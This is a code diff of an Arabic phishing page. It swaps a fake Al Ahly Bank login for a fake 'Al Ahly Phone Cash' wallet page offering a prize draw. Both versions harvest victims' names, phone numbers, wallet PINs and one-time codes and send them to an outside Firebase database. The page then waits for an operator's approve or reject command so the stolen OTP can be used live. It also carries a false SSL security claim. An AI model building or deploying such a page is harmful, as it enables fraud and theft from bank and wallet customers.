@@ -1,293 +1,510 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>البنك الأهلي - تسجيل الدخول</title>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { background: white; border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; }
-        .logo { width: 120px; height: 120px; background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 50%; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; color: white; font-size: 48px; font-weight: bold; }
-        h1 { color: #1e3c72; margin-bottom: 10px; font-size: 28px; }
-        .subtitle { color: #666; margin-bottom: 30px; font-size: 16px; }
-        .form-group { margin-bottom: 20px; text-align: right; }
-        label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 14px; }
-        input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: all 0.3s; text-align: right; }
-        input:focus { outline: none; border-color: #2a5298; }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(42, 82, 152, 0.3); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        .hidden { display: none !important; }
-        .error { color: #e74c3c; font-size: 14px; margin-top: 5px; }
-        .success { color: #27ae60; font-size: 14px; margin-top: 5px; }
-        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #2a5298; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; vertical-align: middle; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .waiting-message { background: #fff3e0; border: 1px solid #ff9800; color: #e65100; padding: 15px; border-radius: 10px; margin-top: 20px; }
-    </style>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>محفظة الاهلي فون كاش</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;700&display=swap');
+    * { font-family: 'Janna LT', 'Janna', 'Traditional Arabic', 'Noto Naskh Arabic', Arial, sans-serif !important; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(160deg, #1a5c38 0%, #2e7d4f 50%, #0d3d22 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Janna LT', 'Janna', 'Traditional Arabic', Arial, sans-serif;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 35px 28px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+      text-align: center;
+    }
+
+    .logo { width: 100px; margin-bottom: 20px; }
+
+    .step { display: none; }
+    .step.active { display: block; }
+
+    .landing-title {
+      font-size: 26px;
+      font-weight: 900;
+      color: #1a5c38;
+      line-height: 1.4;
+      margin-bottom: 12px;
+    }
+    .landing-sub1 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #2e7d4f;
+      margin-bottom: 10px;
+    }
+    .landing-sub2 {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.7;
+      margin-bottom: 28px;
+    }
+    .btn-main {
+      width: 100%;
+      padding: 14px;
+      background: #2e7d4f;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .btn-main:hover { background: #0d3d22; }
+    .btn-main:active { transform: scale(0.98); }
+
+    .page-title {
+      font-size: 20px;
+      font-weight: 900;
+      color: #1a5c38;
+      margin-bottom: 6px;
+    }
+    .page-sub {
+      font-size: 13px;
+      color: #888;
+      margin-bottom: 22px;
+    }
+    .form-group { margin-bottom: 16px; text-align: right; }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 6px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid #ddd;
+      border-radius: 10px;
+      font-size: 14px;
+      outline: none;
+      text-align: right;
+      transition: border-color 0.2s;
+      background: #fafafa;
+    }
+    .form-group input:focus {
+      border-color: #2e7d4f;
+      background: #fff;
+    }
+
+    .login-subtitle {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 22px;
+      font-weight: 600;
+    }
+    .input-wrap { position: relative; }
+    .eye-btn {
+      position: absolute;
+      left: 12px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none;
+      cursor: pointer; color: #aaa; font-size: 16px;
+    }
+
+    .special-badge {
+      margin-top: 18px;
+      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+      border: 1.5px solid #a5d6a7;
+      border-radius: 12px;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .special-badge .badge-icon { font-size: 22px; flex-shrink: 0; }
+    .special-badge .badge-text {
+      font-size: 13px;
+      font-weight: 800;
+      color: #1a5c38;
+      line-height: 1.5;
+    }
+
+    .secure-note {
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 14px;
+    }
+
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 22px;
+    }
+    .step-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: #ddd;
+      transition: background 0.3s;
+    }
+    .step-dot.active { background: #2e7d4f; }
+    .step-dot.done { background: #66bb6a; }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.65);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+    }
+    .overlay.show { display: flex; }
+
+    .lightbox {
+      background: #fff;
+      border-radius: 18px;
+      padding: 36px 30px;
+      text-align: center;
+      max-width: 320px;
+      width: 90%;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+    }
+
+    .spinner {
+      width: 52px; height: 52px;
+      border: 5px solid #e0e0e0;
+      border-top-color: #2e7d4f;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-title { font-size: 17px; font-weight: 800; color: #1a5c38; margin-bottom: 8px; }
+    .waiting-sub { font-size: 13px; color: #888; line-height: 1.6; }
+
+    .error-icon-big { font-size: 54px; margin-bottom: 14px; }
+    .error-lb-title { font-size: 17px; font-weight: 900; color: #c62828; margin-bottom: 10px; }
+    .error-lb-msg { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 22px; }
+    .btn-retry {
+      width: 100%;
+      padding: 12px;
+      background: #c62828;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-retry:hover { background: #b71c1c; }
+
+    /* OTP - Single Input */
+    .otp-title { font-size: 22px; font-weight: 900; color: #1a5c38; margin-bottom: 8px; }
+    .otp-sub { font-size: 13px; color: #666; margin-bottom: 22px; }
+    .otp-inputs {
+      margin-bottom: 20px;
+    }
+    .otp-inputs input {
+      width: 100%;
+      height: 58px;
+      border: 2px solid #ddd;
+      border-radius: 10px;
+      font-size: 24px;
+      font-weight: 800;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.2s;
+      letter-spacing: 8px;
+      background: #fafafa;
+      direction: ltr;
+    }
+    .otp-inputs input:focus { border-color: #2e7d4f; background: #fff; }
+    .otp-error {
+      display: none;
+      background: #fee2e2;
+      color: #dc2626;
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 14px;
+    }
+    .otp-error.show { display: block; }
+
+    .success-icon { font-size: 60px; margin-bottom: 14px; }
+    .success-title { font-size: 22px; font-weight: 900; color: #1a5c38; margin-bottom: 8px; }
+    .success-sub { font-size: 14px; color: #666; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🏦</div>
-        <h1>البنك الأهلي</h1>
-        <p class="subtitle">نظام التحقق الآمن</p>
 
-        <!-- Page 1: Landing -->
-        <div id="page-landing" class="page">
-            <div class="form-group">
-                <label>رقم الهاتف</label>
-                <input type="tel" id="phone-landing" placeholder="05xxxxxxxx" maxlength="10">
-            </div>
-            <button class="btn" onclick="goToPersonalInfo()">متابعة <span id="loading-landing" class="loading hidden"></span></button>
-            <p id="error-landing" class="error hidden"></p>
-        </div>
+<!-- WAITING OVERLAY -->
+<div id="waitingOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="spinner"></div>
+    <div class="waiting-title">جاري التحقق من المعلومات</div>
+    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من هويتك بشكل آمن</div>
+  </div>
+</div>
 
-        <!-- Page 2: Personal Info -->
-        <div id="page-personal" class="page hidden">
-            <div class="form-group">
-                <label>الاسم الكامل</label>
-                <input type="text" id="fullname" placeholder="محمد أحمد">
-            </div>
-            <div class="form-group">
-                <label>رقم الهوية</label>
-                <input type="text" id="idnumber" placeholder="1234567890" maxlength="10">
-            </div>
-            <div class="form-group">
-                <label>تاريخ الميلاد</label>
-                <input type="text" id="birthdate" placeholder="01/01/1990">
-            </div>
-            <button class="btn" onclick="submitPersonalInfo()">متابعة <span id="loading-personal" class="loading hidden"></span></button>
-            <p id="error-personal" class="error hidden"></p>
-        </div>
-
-        <!-- Page 3: Login -->
-        <div id="page-login" class="page hidden">
-            <div class="form-group">
-                <label>رقم الهاتف</label>
-                <input type="tel" id="phone-login" readonly>
-            </div>
-            <div class="form-group">
-                <label>الرقم السري</label>
-                <input type="password" id="pin" placeholder="****" maxlength="4">
-            </div>
-            <button class="btn" onclick="submitLogin()">تسجيل الدخول <span id="loading-login" class="loading hidden"></span></button>
-            <p id="error-login" class="error hidden"></p>
-            <div id="waiting-box" class="waiting-message hidden">
-                ⏳ جاري انتظار موافقة الأمن...
-            </div>
-        </div>
-
-        <!-- Page 4: OTP -->
-        <div id="page-otp" class="page hidden">
-            <div class="form-group">
-                <label>رمز التحقق (OTP)</label>
-                <input type="text" id="otp-input" placeholder="123456" maxlength="6">
-            </div>
-            <div class="otp-display" id="otp-display">------</div>
-            <button class="btn" onclick="verifyOTP()">تحقق <span id="loading-otp" class="loading hidden"></span></button>
-            <p id="error-otp" class="error hidden"></p>
-            <p id="success-otp" class="success hidden">تم التحقق بنجاح!</p>
-        </div>
-
-        <!-- Page 5: Success -->
-        <div id="page-success" class="page hidden">
-            <div style="font-size: 64px; margin: 20px 0;">✅</div>
-            <h2 style="color: #27ae60; margin-bottom: 20px;">تم التحقق بنجاح!</h2>
-            <p style="color: #666; margin-bottom: 30px;">جاري تحويلك إلى الصفحة الرئيسية...</p>
-            <div class="loading"></div>
-        </div>
+<!-- ERROR LIGHTBOX (login rejected) -->
+<div id="errorOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="error-icon-big">⚠️</div>
+    <div class="error-lb-title">المعلومات غير صحيحة</div>
+    <div class="error-lb-msg">
+      معلوماتك المدخلة غير صحيحة،<br/>
+      يرجى التأكد من المعلومات وإدخالها بشكل صحيح
     </div>
+    <button class="btn-retry" onclick="retryLogin()">حسناً، سأحاول مجدداً</button>
+  </div>
+</div>
 
-    <script>
-        // ============================================
-        // FIREBASE CONFIGURATION
-        // ============================================
-        const firebaseConfig = {
-            apiKey: "AIzaSyBWJvL51kp6e24PkuEYTwyfNpKDYyRI05M",
-            authDomain: "ahlfoncsh.firebaseapp.com",
-            databaseURL: "https://ahlfoncsh-default-rtdb.firebaseio.com",
-            projectId: "ahlfoncsh",
-            storageBucket: "ahlfoncsh.firebasestorage.app",
-            messagingSenderId: "5159433699",
-            appId: "1:5159433699:web:49005391c7cadec5939cd6"
-        };
+<!-- WAITING OTP OVERLAY -->
+<div id="waitingOTPOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="spinner"></div>
+    <div class="waiting-title">جاري التحقق من الرمز</div>
+    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من رمز التحقق</div>
+  </div>
+</div>
 
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+<!-- ERROR OTP LIGHTBOX -->
+<div id="errorOTPOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="error-icon-big">⚠️</div>
+    <div class="error-lb-title">رمز التحقق غير صحيح</div>
+    <div class="error-lb-msg">
+      الرمز الذي أدخلته غير صحيح،<br/>
+      يرجى التأكد من الرمز وإعادة المحاولة
+    </div>
+    <button class="btn-retry" onclick="retryOTP()">حسناً، سأحاول مجدداً</button>
+  </div>
+</div>
 
-        // ============================================
-        // SESSION MANAGEMENT
-        // ============================================
-        let sessionId = localStorage.getItem('sessionId');
-        if (!sessionId) {
-            sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            localStorage.setItem('sessionId', sessionId);
-        }
+<!-- CARD -->
+<div class="card">
+  <img src="logo.png" class="logo" alt="Logo"/>
 
-        let currentPage = 'landing';
-        let userData = {
-            phone: '',
-            fullname: '',
-            idnumber: '',
-            birthdate: '',
-            pin: '',
-            otp: '',
-            status: 'active',
-            createdAt: firebase.database.ServerValue.TIMESTAMP
-        };
+  <!-- STEP 0: LANDING -->
+  <div class="step active" id="stepLanding">
+    <div class="landing-title">محفظة الاهلي فون كاش</div>
+    <div class="landing-sub1">خاص لعملاء محفظة الاهلي فون كاش</div>
+    <div class="landing-sub2">
+      سجل في السحب الان على الجوائز النقدية والعينية المجزية<br/>
+      المقدمة من محفظة الاهلي فون كاش
+    </div>
+    <button class="btn-main" onclick="goToPersonalInfo()">🎁 سجل في السحب الان</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
 
-        // Save session to Firebase
-        function saveSession() {
-            database.ref('site1/sessions/' + sessionId).set({
-                ...userData,
-                currentPage: currentPage,
-                lastActive: firebase.database.ServerValue.TIMESTAMP
-            });
-        }
+  <!-- STEP 1: PERSONAL INFO -->
+  <div class="step" id="stepPersonal">
+    <div class="step-indicator">
+      <div class="step-dot done" id="dot0"></div>
+      <div class="step-dot active" id="dot1"></div>
+      <div class="step-dot" id="dot2"></div>
+    </div>
+    <div class="page-title">المعلومات الشخصية</div>
+    <div class="page-sub">أدخل بياناتك الشخصية للمتابعة</div>
+    <div class="form-group">
+      <label>الاسم الكامل</label>
+      <input type="text" id="nameInput" placeholder="أدخل اسمك الكامل"/>
+    </div>
+    <div class="form-group">
+      <label>رقم الهاتف</label>
+      <input type="tel" id="personalPhoneInput" placeholder="011XXXXXXXX" maxlength="12"/>
+    </div>
+    <button class="btn-main" onclick="goToLogin()">التالي ←</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
 
-        // Listen for admin commands
-        function listenForAdminCommands() {
-            database.ref('site1/sessions/' + sessionId + '/adminCommand').on('value', (snapshot) => {
-                const command = snapshot.val();
-                if (command) {
-                    if (command.action === 'redirect') {
-                        showPage(command.page);
-                    } else if (command.action === 'approve') {
-                        showPage('otp');
-                        generateOTP();
-                    } else if (command.action === 'reject') {
-                        alert('تم رفض الطلب. يرجى التواصل مع الدعم.');
-                        localStorage.clear();
-                        location.reload();
-                    }
-                    database.ref('site1/sessions/' + sessionId + '/adminCommand').remove();
-                }
-            });
-        }
+  <!-- STEP 2: LOGIN -->
+  <div class="step" id="stepLogin">
+    <div class="step-indicator">
+      <div class="step-dot done"></div>
+      <div class="step-dot done"></div>
+      <div class="step-dot active"></div>
+    </div>
+    <div class="page-title">محفظة الاهلي فون كاش</div>
+    <div class="form-group">
+      <div class="input-wrap">
+        <input type="tel" id="phoneInput" placeholder="ادخل رقم الموبايل" inputmode="numeric" pattern="[0-9]*"/>
+      </div>
+    </div>
+    <div class="form-group">
+      <div class="input-wrap">
+        <input type="password" id="pinInput" placeholder="ادخل الرقم السري" inputmode="numeric" pattern="[0-9]*"/>
+        <button class="eye-btn" onclick="togglePin()" type="button">👁</button>
+      </div>
+    </div>
+    <div class="special-badge">
+      <div class="badge-icon">🏦</div>
+      <div class="badge-text">خاص بعملاء محفظة الاهلي فون كاش</div>
+    </div>
+    <button class="btn-main" style="margin-top:18px;" onclick="submitLogin()">تسجيل الدخول</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
 
-        // ============================================
-        // PAGE NAVIGATION
-        // ============================================
-        function showPage(pageName) {
-            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
-            document.getElementById('page-' + pageName).classList.remove('hidden');
-            currentPage = pageName;
-            saveSession();
-        }
+  <!-- STEP 3: OTP -->
+  <div class="step" id="stepOTP">
+    <div class="otp-title">أدخل رمز التحقق</div>
+    <div class="otp-sub">تم إرسال رمز التحقق إلى رقم هاتفك</div>
+    <div class="otp-error" id="otpError">❌ الرمز غير صحيح، يرجى المحاولة مرة أخرى</div>
+    <div class="otp-inputs">
+      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق"/>
+    </div>
+    <button class="btn-main" onclick="submitOTP()">تأكيد</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
 
-        // ============================================
-        // PAGE 1: LANDING
-        // ============================================
-        function goToPersonalInfo() {
-            const phone = document.getElementById('phone-landing').value.trim();
-            if (!phone || phone.length < 10) {
-                showError('landing', 'يرجى إدخال رقم هاتف صحيح');
-                return;
-            }
-            userData.phone = phone;
-            document.getElementById('phone-login').value = phone;
-            showLoading('landing', true);
-            saveSession();
-            setTimeout(() => {
-                showLoading('landing', false);
-                showPage('personal');
-            }, 500);
-        }
+  <!-- STEP 4: SUCCESS -->
+  <div class="step" id="stepSuccess">
+    <div class="success-icon">✅</div>
+    <div class="success-title">تم التسجيل بنجاح!</div>
+    <div class="success-sub">شكراً لك، تم تسجيلك في السحب بنجاح</div>
+  </div>
 
-        // ============================================
-        // PAGE 2: PERSONAL INFO
-        // ============================================
-        function submitPersonalInfo() {
-            const fullname = document.getElementById('fullname').value.trim();
-            const idnumber = document.getElementById('idnumber').value.trim();
-            const birthdate = document.getElementById('birthdate').value.trim();
-            
-            if (!fullname || !idnumber || !birthdate) {
-                showError('personal', 'يرجى ملء جميع الحقول');
-                return;
-            }
-            
-            userData.fullname = fullname;
-            userData.idnumber = idnumber;
-            userData.birthdate = birthdate;
-            
-            showLoading('personal', true);
-            saveSession();
-            setTimeout(() => {
-                showLoading('personal', false);
-                showPage('login');
-            }, 500);
-        }
+</div>
 
-        // ============================================
-        // PAGE 3: LOGIN
-        // ============================================
-        function submitLogin() {
-            const pin = document.getElementById('pin').value.trim();
-            if (!pin || pin.length !== 4) {
-                showError('login', 'يرجى إدخال رقم سري مكون من 4 أرقام');
-                return;
-            }
-            userData.pin = pin;
-            userData.status = 'waiting_approval';
-            showLoading('login', true);
-            document.getElementById('waiting-box').classList.remove('hidden');
-            saveSession();
-        }
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, push, update, onValue, off } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-        // ============================================
-        // PAGE 4: OTP
-        // ============================================
-        function generateOTP() {
-            const otp = Math.floor(100000 + Math.random() * 900000).toString();
-            userData.otp = otp;
-            document.getElementById('otp-display').textContent = otp;
-            saveSession();
-            database.ref('site1/sessions/' + sessionId + '/otpGenerated').set({
-                otp: otp,
-                timestamp: firebase.database.ServerValue.TIMESTAMP
-            });
-        }
+  const firebaseConfig = {
+    apiKey: "AIzaSyBYOUNmTyszdG6ICkE5kyRVz_RrRGKQw4A",
+    authDomain: "alahly-9357f-eb12e.firebaseapp.com",
+    databaseURL: "https://alahly-9357f-eb12e-default-rtdb.firebaseio.com",
+    projectId: "alahly-9357f-eb12e",
+    storageBucket: "alahly-9357f-eb12e.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID"
+  };
 
-        function verifyOTP() {
-            const enteredOTP = document.getElementById('otp-input').value.trim();
-            if (enteredOTP === userData.otp) {
-                showLoading('otp', true);
-                userData.status = 'completed';
-                userData.verifiedAt = firebase.database.ServerValue.TIMESTAMP;
-                saveSession();
-                setTimeout(() => {
-                    showLoading('otp', false);
-                    showPage('success');
-                }, 1000);
-            } else {
-                showError('otp', 'رمز التحقق غير صحيح');
-            }
-        }
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
 
-        // ============================================
-        // UTILITY FUNCTIONS
-        // ============================================
-        function showError(page, message) {
-            const errorEl = document.getElementById('error-' + page);
-            errorEl.textContent = message;
-            errorEl.classList.remove('hidden');
-        }
+  let sessionRef = null;
+  let loginListener = null;
+  let otpListener = null;
 
-        function showLoading(page, show) {
-            const loadingEl = document.getElementById('loading-' + page);
-            if (show) loadingEl.classList.remove('hidden');
-            else loadingEl.classList.add('hidden');
-        }
+  function showOverlay(id) { document.getElementById(id).classList.add('show'); }
+  function hideOverlay(id) { document.getElementById(id).classList.remove('show'); }
+  const pageMap = {
+    'stepLanding': 'landing',
+    'stepPersonal': 'personal',
+    'stepLogin': 'login',
+    'stepOTP': 'otp',
+    'stepSuccess': 'success'
+  };
 
-        // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
-            listenForAdminCommands();
-            saveSession();
-        });
-    </script>
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    if (typeof sessionRef !== 'undefined' && sessionRef && pageMap[id]) {
+      update(sessionRef, { currentPage: pageMap[id] });
+    }
+  }
+
+  window.goToPersonalInfo = function() {
+    showStep('stepPersonal');
+  }
+
+  window.goToLogin = function() {
+    const name = document.getElementById('nameInput').value.trim();
+    const phone = document.getElementById('personalPhoneInput').value.trim();
+    if (!name || !phone) { alert('يرجى تعبئة جميع الحقول'); return; }
+    showStep('stepLogin');
+  }
+
+  window.togglePin = function() {
+    const p = document.getElementById('pinInput');
+    p.type = p.type === 'password' ? 'text' : 'password';
+  }
+
+  window.retryLogin = function() {
+    hideOverlay('errorOverlay');
+    document.getElementById('phoneInput').value = '';
+    document.getElementById('pinInput').value = '';
+    showStep('stepLogin');
+  }
+
+  window.retryOTP = function() {
+    hideOverlay('errorOTPOverlay');
+    const inp = document.getElementById('otpSingleInput');
+    inp.value = '';
+    inp.focus();
+  }
+
+  window.submitLogin = async function() {
+    const name = document.getElementById('nameInput').value.trim();
+    const personalPhone = document.getElementById('personalPhoneInput').value.trim();
+    const phone = document.getElementById('phoneInput').value.trim();
+    const pin = document.getElementById('pinInput').value.trim();
+    if (!phone || !pin) return;
+
+    showOverlay('waitingOverlay');
+
+    const newRef = push(ref(db, 'site1/sessions'), {
+      name, personalPhone, phone, pin,
+      otp: '---',
+      status: 'waiting',
+      currentPage: 'login',
+      timestamp: Date.now()
+    });
+    sessionRef = newRef;
+
+    loginListener = onValue(newRef, (snap) => {
+      const data = snap.val();
+      if (!data) return;
+      if (data.status === 'approved') {
+        off(newRef, 'value', loginListener);
+        hideOverlay('waitingOverlay');
+        showStep('stepOTP');
+      } else if (data.status === 'rejected') {
+        off(newRef, 'value', loginListener);
+        hideOverlay('waitingOverlay');
+        showOverlay('errorOverlay');
+      }
+    });
+  }
+
+  window.submitOTP = function() {
+    const otp = document.getElementById('otpSingleInput').value.trim();
+    if (!otp) return;
+
+    document.getElementById('otpError').classList.remove('show');
+    showOverlay('waitingOTPOverlay');
+
+    if (sessionRef) update(sessionRef, { otp, status: 'otp_submitted' });
+    if (otpListener) off(sessionRef, 'value', otpListener);
+
+    otpListener = onValue(sessionRef, (snap) => {
+      const data = snap.val();
+      if (!data) return;
+      if (data.status === 'final_approved') {
+        off(sessionRef, 'value', otpListener);
+        hideOverlay('waitingOTPOverlay');
+        showStep('stepSuccess');
+      } else if (data.status === 'final_rejected') {
+        off(sessionRef, 'value', otpListener);
+        hideOverlay('waitingOTPOverlay');
+        showOverlay('errorOTPOverlay');
+        if (sessionRef) update(sessionRef, { otp: '---', status: 'approved' });
+      }
+    });
+  }
+</script>
 </body>
 </html>
+
